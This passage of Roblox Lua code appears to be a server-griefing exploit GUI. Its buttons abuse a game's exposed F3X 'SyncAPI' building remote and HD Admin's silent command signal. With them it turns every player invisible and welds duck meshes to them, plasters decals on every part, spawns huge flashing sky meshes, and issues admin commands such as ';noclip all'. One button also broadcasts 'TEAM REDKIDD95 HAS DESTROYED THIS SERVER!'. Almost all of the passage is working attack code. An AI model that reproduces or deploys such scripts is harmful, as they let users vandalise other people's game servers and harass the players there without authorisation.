						_(args)
					end
		
					function SetMesh(part,meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..meshid
								}
							}
						}
						_(args)
					end
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..texid
								}
							}
						}
						_(args)
					end
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = part,
							},
							[3] = stringg
						}
		
						_(args)
					end
					function MeshResize(part,size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
					function Weld(part1, part2,lead)
						local args = {
							[1] = "CreateWelds",
							[2] = {
								[1] = part1,
								[2] = part2
							},
							[3] = lead
						}
						_(args)
		
					end
					function SetLocked(part,boolean)
						local args = {
							[1] = "SetLocked",
							[2] = {
								[1] = part
							},
							[3] = boolean
						}
						_(args)
					end
					function SetTrans(part,int)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = int
								}
							}
						}
						_(args)
					end
					function CreateSpotlight(part)
						local args = {
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = workspace.Part,
									["LightType"] = "SpotLight"
								}
							}
						}
						_(args)
					end
					function SyncLighting(part,brightness)
						local args = {
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						}
						_(args)
					end
					function Duckify(player)
						for i,v in player.Character:GetDescendants() do
							if v:IsA("BasePart") then
								pcall(function()
									SetLocked(v,false)
									SetTrans(v,1)
								end)
							end
						end
						char = player.Character
						--spawn(function()
						spawn(function()
							SetAnchor(true,char.HumanoidRootPart)
							CreatePart(char.HumanoidRootPart.CFrame,char)
							SetCollision(char.Part,false)
							SetName(char.Part, "Duck")
						end)
						repeat wait() until char:FindFirstChild("Duck")
						spawn(function()
							SetLocked(char.Duck,false)
							SetLocked(char.HumanoidRootPart,false)
							Weld(char.Duck,char.HumanoidRootPart,char.Duck)
							SetAnchor(false,char.Duck)
							AddMesh(char.Duck)
						end)
						repeat wait() until char.Duck:FindFirstChild("Mesh")
						MeshResize(char.Duck,Vector3.new(8,8,8))
						SetMesh(char.Duck,"10749878672")
						SetTexture(char.Duck,"10749878886")
						SetAnchor(false,char.HumanoidRootPart)
						--end)
					end
					for i,v in game.Players:GetPlayers() do
						--spawn(function()
						Duckify(v)
						--end)
					end
				end)
			end
			coroutine.wrap(GZYV_fake_script)()
			local function ZTEPKD_fake_script() -- b_18.LocalScript 
				local script = Instance.new('LocalScript', b_18)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local player = game.Players.LocalPlayer
					local char = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					--craaa
					remote = tool.SyncAPI.ServerEndpoint
					function _(args)
						remote:InvokeServer(unpack(args))
					end
					function SetCollision(part,boolean)
						local args = {
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = boolean
								}
							}
						}
						_(args)
					end
					function SetAnchor(boolean,part)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
					function CreatePart(cf,parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
					function MovePart(part,cf)
						local args = {
							[1] = "SyncMove",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf
								}
							}
						}
						_(args)
					end
					function Resize(part,size,cf)
						local args = {
							[1] = "SyncResize",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf,
									["Size"] = size
								}
							}
						}
						_(args)
					end
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part,meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..meshid
								}
							}
						}
						_(args)
					end
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..texid
								}
							}
						}
						_(args)
					end
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = part
							},
							[3] = stringg
						}
		
						_(args)
					end
					function MeshResize(part,size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
					function Weld(part1, part2,lead)
						local args = {
							[1] = "CreateWelds",
							[2] = {
								[1] = part1,
								[2] = part2
							},
							[3] = lead
						}
						_(args)
		
					end
					function SetLocked(part,boolean)
						local args = {
							[1] = "SetLocked",
							[2] = {
								[1] = part
							},
							[3] = boolean
						}
						_(args)
					end
					function SetTrans(part,int)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = int
								}
							}
						}
						_(args)
					end
					function CreateSpotlight(part)
						local args = {
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						}
						_(args)
					end
					function SyncLighting(part,brightness)
						local args = {
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						}
						_(args)
					end
					function Color(part,color)
						local args = {
							[1] = "SyncColor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Color"] = color --[[Color3]],
									["UnionColoring"] = false
								}
							}
						}
						_(args)
					end
					function SpawnDecal(part,side)
						local args = {
							[1] = "CreateTextures",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = side,
									["TextureType"] = "Decal"
								}
							}
						}
		
						_(args)
					end
					function AddDecal(part,asset,side)
						local args = {
							[1] = "SyncTexture",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = side,
									["TextureType"] = "Decal",
									["Texture"] = "rbxassetid://".. asset
								}
							}
						}
						_(args)
					end
		
					function spam(id)
						for i,v in game.workspace:GetDescendants() do
							if v:IsA("BasePart") then
								spawn(function()
									SetLocked(v,false)
									SpawnDecal(v,Enum.NormalId.Front)
									AddDecal(v,id,Enum.NormalId.Front)
		
									SpawnDecal(v,Enum.NormalId.Back)
									AddDecal(v,id,Enum.NormalId.Back)
		
									SpawnDecal(v,Enum.NormalId.Right)
									AddDecal(v,id,Enum.NormalId.Right)
		
									SpawnDecal(v,Enum.NormalId.Left)
									AddDecal(v,id,Enum.NormalId.Left)
		
									SpawnDecal(v,Enum.NormalId.Bottom)
									AddDecal(v,id,Enum.NormalId.Bottom)
		
									SpawnDecal(v,Enum.NormalId.Top)
									AddDecal(v,id,Enum.NormalId.Top)
								end)
							end
						end 
					end
					spam("97518021379547")
				end)
			end
			coroutine.wrap(ZTEPKD_fake_script)()
			local function UYNRJ_fake_script() -- b_19.LocalScript 
				local script = Instance.new('LocalScript', b_19)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";disco ;fogcolor white")
					wait(0.25)
		
				end)
			end
			coroutine.wrap(UYNRJ_fake_script)()
			local function XLWU_fake_script() -- b_20.LocalScript 
				local script = Instance.new('LocalScript', b_20)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";h TEAM REDKIDD95 HAS DESTROYED THIS SERVER!")
				end)
			end
			coroutine.wrap(XLWU_fake_script)()
			local function DUSSO_fake_script() -- b_21.LocalScript 
				local script = Instance.new('LocalScript', b_21)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";fly")
				end)
			end
			coroutine.wrap(DUSSO_fake_script)()
			local function LCKZXVE_fake_script() -- b_22.LocalScript 
				local script = Instance.new('LocalScript', b_22)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";btools")
				end)
			end
			coroutine.wrap(LCKZXVE_fake_script)()
			local function MXJX_fake_script() -- b_23.LocalScript 
				local script = Instance.new('LocalScript', b_23)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";titler me redkidd95Alt")
				end)
			end
			coroutine.wrap(MXJX_fake_script)()
			local function EWMNR_fake_script() -- b_24.LocalScript 
				local script = Instance.new('LocalScript', b_24)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";r6 others")
				end)
			end
			coroutine.wrap(EWMNR_fake_script)()
			local function BBYELQP_fake_script() -- b_25.LocalScript 
				local script = Instance.new('LocalScript', b_25)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";r15 all")
				end)
			end
			coroutine.wrap(BBYELQP_fake_script)()
			local function WMQVE_fake_script() -- b_26.LocalScript 
				local script = Instance.new('LocalScript', b_26)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";servermessage get rekt omg")
				end)
			end
			coroutine.wrap(WMQVE_fake_script)()
			local function LMDHP_fake_script() -- b_27.LocalScript 
				local script = Instance.new('LocalScript', b_27)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";sword all")
				end)
			end
			coroutine.wrap(LMDHP_fake_script)()
			local function SUYGLS_fake_script() -- b_28.LocalScript 
				local script = Instance.new('LocalScript', b_28)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";dog all")
				end)
			end
			coroutine.wrap(SUYGLS_fake_script)()
			local function KIOD_fake_script() -- b_29.LocalScript 
				local script = Instance.new('LocalScript', b_29)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";noclip all")
				end)
			end
			coroutine.wrap(KIOD_fake_script)()
			local function OBLAFWX_fake_script() -- b_30.LocalScript 
				local script = Instance.new('LocalScript', b_30)
		
				local Players = game:GetService("Players")
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RunService = game:GetService("RunService")
		
				local player = Players.LocalPlayer
				local button = script.Parent
		
				local tool, remote
				local hrp
		
				local function WaitForSyncAPI()
					local t
					while not t do
						for _, v in ipairs(player:GetDescendants()) do
							if v.Name == "SyncAPI" then
								t = v.Parent
								break
							end
						end
						for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
							if v.Name == "SyncAPI" then
								t = v.Parent
								break
							end
						end
						task.wait(0.5)
					end
					return t
				end
		
				local function Refresh()
					tool = WaitForSyncAPI()
					remote = tool.SyncAPI.ServerEndpoint
				end
		
				player.CharacterAdded:Connect(function(char)
					hrp = char:WaitForChild("HumanoidRootPart")
					task.wait(0.5)
					Refresh()
				end)
		
				if player.Character then
					hrp = player.Character:WaitForChild("HumanoidRootPart")
					Refresh()
				end
		
				local function _(args)
					if not remote then return end
					pcall(function()
						remote:InvokeServer(unpack(args))
					end)
				end
		
				local function CreatePart(cf)
					_({"CreatePart", "Normal", cf, workspace})
				end
		
				local function Anchor(p)
					_({"SyncAnchor", {{Part = p, Anchored = true}}})
				end
		
				local function AddMesh(p)
					_({"CreateMeshes", {{Part = p}}})
				end
		
				local function SetMesh(p, id)
					_({"SyncMesh", {{Part = p, MeshId = "rbxassetid://"..id}}})
				end
		
				local function SetTexture(p, id)
					_({"SyncMesh", {{Part = p, TextureId = "rbxassetid://"..id}}})
				end
		
				local function ResizeMesh(p, s)
					_({"SyncMesh", {{Part = p, Scale = s}}})
				end
		
				button.MouseButton1Click:Connect(function()
					if not hrp then return end
		
					local baseCF = CFrame.new(hrp.Position + Vector3.new(0,6,0))
					CreatePart(baseCF)
					task.wait(0.4)
		
					local part
					for _, v in ipairs(workspace:GetDescendants()) do
						if v:IsA("BasePart") and (v.Position - baseCF.Position).Magnitude < 0.2 then
							part = v
							break
						end
					end
					if not part then return end
					Anchor(part)
					AddMesh(part)
					SetMesh(part, "111891702759441")
					SetTexture(part, "104015451097966")
					ResizeMesh(part, Vector3.new(3000,3000,3000))
		
					local rot = Vector3.new(0,0,0)
		
					local speedX = 50
					local speedY = 50
					local speedZ = 50
		
					RunService.Heartbeat:Connect(function(dt)
						if not part then return end
		
						rot = Vector3.new(
							(rot.X + speedX * dt) % 360,
							(rot.Y + speedY * dt) % 360,
							(rot.Z + speedZ * dt) % 360
						)
		
						local cf =
							baseCF *
							CFrame.Angles(
								math.rad(rot.X),
								math.rad(rot.Y),
								math.rad(rot.Z)
							)
		
						_({"SyncMove", {{Part = part, CFrame = cf}}})
					end)
				end)
			end
			coroutine.wrap(OBLAFWX_fake_script)()
			local function ZFVQHZ_fake_script() -- b_31.LocalScript 
				local script = Instance.new('LocalScript', b_31)
		
				script.Parent.MouseButton1Click:Connect(function()
					local player = game.Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
					local tool
		
					for i, v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					for i, v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
					local RunService = game:GetService("RunService")
		
					function _(args)
						remote:InvokeServer(unpack(args))
					end
		
					function CreatePart(cf, parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
		
					function SetAnchor(part, boolean)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
		
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part, meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://" .. meshid
								}
							}
						}
						_(args)
					end
		
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = texid
								}
							}
						}
						_(args)
					end
		
					function MeshResize(part, size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
		
					function SetTransparency(part, value)
						local args = {
							[1] = "SyncTransparency",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = value
								}
							}
						}
						_(args)
					end
		
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = part
							},
							[3] = stringg
						}
		
						_(args)
					end
		
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
		
					local images = {
						"http://www.roblox.com/asset/?id=80284567792891",
						"http://www.roblox.com/asset/?id=128175753315310",
						"http://www.roblox.com/asset/?id=108358121529123",
						"http://www.roblox.com/asset/?id=126489332710448",
						"http://www.roblox.com/asset/?id=117570936956487",
						"http://www.roblox.com/asset/?id=122661378990512",
						"http://www.roblox.com/asset/?id=139577836503158",
						"http://www.roblox.com/asset/?id=91913326413267",
						"http://www.roblox.com/asset/?id=73660049182081",
						"http://www.roblox.com/asset/?id=123376302324197",
						"http://www.roblox.com/asset/?id=99976919757191"
					}
		
					local skyPart
					local skyLoop
					local frameTime = 2 / 10
					local lastUpdate = 0
		
					function CreateSky()
						local hrp = char:FindFirstChild("HumanoidRootPart")
						if not hrp then return end
		
						local cf = hrp.CFrame
						CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
		
						for _, v in workspace:GetDescendants() do
							if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
								skyPart = v
								SetAnchor(skyPart, true)
								AddMesh(skyPart)
								SetMesh(skyPart, "111891702759441")
								MeshResize(skyPart, Vector3.new(4000, 4000, 4000))
								SetTransparency(skyPart, 1)
								SetName(v,"Sky")
		
								local index = 1
								skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
									lastUpdate = lastUpdate + deltaTime
									if lastUpdate >= frameTime then
										lastUpdate = 0
										if not skyPart then
											print("fuck ittt")
											return
										end
										SetTransparency(skyPart, 0)
										SetTexture(skyPart, images[index])
										index = index % #images + 1
									end
								end)
							end
						end
					end
		
					function ResetSky()
						if skyPart then
							DestroyPart(skyPart)
							skyPart = nil
						end
						if skyLoop then
							skyLoop:Disconnect()
							skyLoop = nil
						end
						CreateSky()
					end
		
					player.CharacterAdded:Connect(function(newChar)
						char = newChar
						ResetSky()
					end)
		
					if char and char:FindFirstChild("Humanoid") then
						char:WaitForChild("Humanoid").Died:Connect(function()
							ResetSky()
						end)
					end
		
					CreateSky()
				end)
			end
			coroutine.wrap(ZFVQHZ_fake_script)()
			local function SMIX_fake_script() -- b_32.LocalScript 
				local script = Instance.new('LocalScript', b_32)
		
				script.Parent.MouseButton1Click:Connect(function()
					local player = game.Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
					local tool
		
					for i, v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					for i, v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
					local RunService = game:GetService("RunService")
		
					function _(args)
						remote:InvokeServer(unpack(args))
					end
		
					function CreatePart(cf, parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
		
					function SetAnchor(part, boolean)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
		
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part, meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://" .. meshid
								}
							}
						}
						_(args)
					end
		
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = texid
								}
							}
						}
						_(args)
					end
		
					function MeshResize(part, size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
		
					function SetTransparency(part, value)
						local args = {
							[1] = "SyncTransparency",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = value
								}
							}
						}
						_(args)
					end
		
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = part
							},
							[3] = stringg
						}
		
						_(args)
					end
		
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
		
					local images = {
						"rbxassetid://121307077299366", --1
						"rbxassetid://91382383089634", --2
						"rbxassetid://73188922546657", --3
						"rbxassetid://89217992797022", --4
						"rbxassetid://77929289056373", --5
						"rbxassetid://127271771565371", --6
						"rbxassetid://78634186908315", --7
						"rbxassetid://94416686075730", --8
						"rbxassetid://98034740736063", --9
						"rbxassetid://79199428122860", --10
						"rbxassetid://124205531516252", --11
						"rbxassetid://89541686591267", --12
						"rbxassetid://121812322375747", --13
						"rbxassetid://107035915702045",-- 14
						"rbxassetid://121021080673938",--15
						"rbxassetid://94928775380844",--16
						"rbxassetid://133789954883077",--17
						"rbxassetid://74664840673083",--18
						"rbxassetid://98456061103883",--19
						"rbxassetid://106502103392081"--20
					}
		
					local skyPart
					local skyLoop
					local frameTime = 2 / 20
					local lastUpdate = 0
		
					function CreateSky()
						local hrp = char:FindFirstChild("HumanoidRootPart")
						if not hrp then return end
		
						local cf = hrp.CFrame
						CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
		
						for _, v in workspace:GetDescendants() do
							if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
								skyPart = v
								SetAnchor(skyPart, true)
								AddMesh(skyPart)
								SetMesh(skyPart, "111891702759441")
								MeshResize(skyPart, Vector3.new(4000, 4000, 4000))
								SetTransparency(skyPart, 1)
								SetName(v,"Sky")
		
								local index = 1
								skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
									lastUpdate = lastUpdate + deltaTime
									if lastUpdate >= frameTime then
										lastUpdate = 0
										if not skyPart then
											print("fuck ittt")
											return
										end
										SetTransparency(skyPart, 0)
										SetTexture(skyPart, images[index])
										index = index % #images + 1
									end
								end)
							end
						end
					end
		
					function ResetSky()
						if skyPart then
							DestroyPart(skyPart)
							skyPart = nil
						end
						if skyLoop then
							skyLoop:Disconnect()
							skyLoop = nil
						end
						CreateSky()
					end
		
					player.CharacterAdded:Connect(function(newChar)
						char = newChar
						ResetSky()
					end)
		
					if char and char:FindFirstChild("Humanoid") then
						char:WaitForChild("Humanoid").Died:Connect(function()
							ResetSky()
						end)
					end
		
					CreateSky()
				end)
			end
			coroutine.wrap(SMIX_fake_script)()
			local function AICIUKW_fake_script() -- b_33.LocalScript 
				local script = Instance.new('LocalScript', b_33)
		
				script.Parent.MouseButton1Click:Connect(function()
					local player = game.Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
					local tool
		
					for i, v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					for i, v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
					local RunService = game:GetService("RunService")
		
					function _(args)
						remote:InvokeServer(unpack(args))
					end
		
					function CreatePart(cf, parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
		
					function SetAnchor(part, boolean)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
		
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part, meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://" .. meshid
								}
							}
						}
						_(args)
					end
		
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = texid
								}
							}
						}
						_(args)
					end
		
					function MeshResize(part, size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
		
					function SetTransparency(part, value)
						local args = {
							[1] = "SyncTransparency",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = value
								}
							}
						}
						_(args)
					end
		
		
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = part
							},
							[3] = stringg
						}
		
						_(args)
					end
		
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
		
					local images = {
						"rbxassetid://102681428361624",
						"rbxassetid://82853434525579"
					}
		
					local skyPart
					local skyLoop
					local frameTime = 2 / 20
					local lastUpdate = 0
		
					function CreateSky()
						local hrp = char:FindFirstChild("HumanoidRootPart")
						if not hrp then return end
		
						local cf = hrp.CFrame
						CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
		
						for _, v in workspace:GetDescendants() do
							if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
								skyPart = v
								SetAnchor(skyPart, true)
								AddMesh(skyPart)
								SetMesh(skyPart, "111891702759441")
								MeshResize(skyPart, Vector3.new(5000, 5000, 5000))
								SetTransparency(skyPart, 1)
								SetName(v,"Sky")
		
								function SyncLighting(part,brightness)
									_({
										[1] = "SyncLighting",
										[2] = {
											[1] = {
												["Part"] = part,
												["LightType"] = "SpotLight",
												["Brightness"] = brightness
											}
										}
									})
								end
		
								local index = 1
								skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
									lastUpdate = lastUpdate + deltaTime
									if lastUpdate >= frameTime then
										lastUpdate = 0
										if not skyPart then
											print("fuck ittt")
											return
										end
										SetTransparency(skyPart, 0)
										SetTexture(skyPart, images[index])
										index = index % #images + 1
									end
								end)
							end
						end
					end
		
					function ResetSky()
						if skyPart then
							DestroyPart(skyPart)
							skyPart = nil
						end
						if skyLoop then
							skyLoop:Disconnect()
							skyLoop = nil
						end
						CreateSky()
					end
		
					player.CharacterAdded:Connect(function(newChar)
						char = newChar
						ResetSky()
					end)
		
					if char and char:FindFirstChild("Humanoid") then
						char:WaitForChild("Humanoid").Died:Connect(function()
							ResetSky()
						end)
					end
		
					CreateSky()
				end)
			end
			coroutine.wrap(AICIUKW_fake_script)()
			local function JFVF_fake_script() -- jeje_3.LocalScript 
				local script = Instance.new('LocalScript', jeje_3)
		
				while wait() do
					for i = 0,255,5 do
						script.Parent.ImageColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
						wait(0.01)
					end
					for i = 255,0,-5 do
						script.Parent.ImageColor3 = Color3.fromRGB(i,255,0)
						wait(0.01)
					end
					for i = 0,255,5 do
						script.Parent.ImageColor3 = Color3.fromRGB(0,255,i)
						wait(0.01)
					end
					for i = 255,0,-5 do
						script.Parent.ImageColor3 = Color3.fromRGB(0,i,255)
						wait(0.01)
					end
					for i = 0,255,5 do
						script.Parent.ImageColor3 = Color3.fromRGB(i,0,255)
						wait(0.01)
					end
					for i = 255,0,-5 do
						script.Parent.ImageColor3 = Color3.fromRGB(255,0,i)
						wait(0.01)
					end
				end
			end
			coroutine.wrap(JFVF_fake_script)()
			local function IUCK_fake_script() -- b_34.LocalScript 
				local script = Instance.new('LocalScript', b_34)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
		
					local player = game.Players.LocalPlayer
					local char = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					--craaa
					remote = tool.SyncAPI.ServerEndpoint
					function _(args)
						remote:InvokeServer(unpack(args))
					end
					function SetCollision(part,boolean)
						local args = {
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = boolean
								}
							}
						}
						_(args)
					end
					function SetAnchor(boolean,part)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
					function CreatePart(cf,parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
					function MovePart(part,cf)
						local args = {
							[1] = "SyncMove",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf
								}
							}
						}
						_(args)
					end
					function Resize(part,size,cf)
						local args = {
							[1] = "SyncResize",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf,
									["Size"] = size
								}
							}
						}
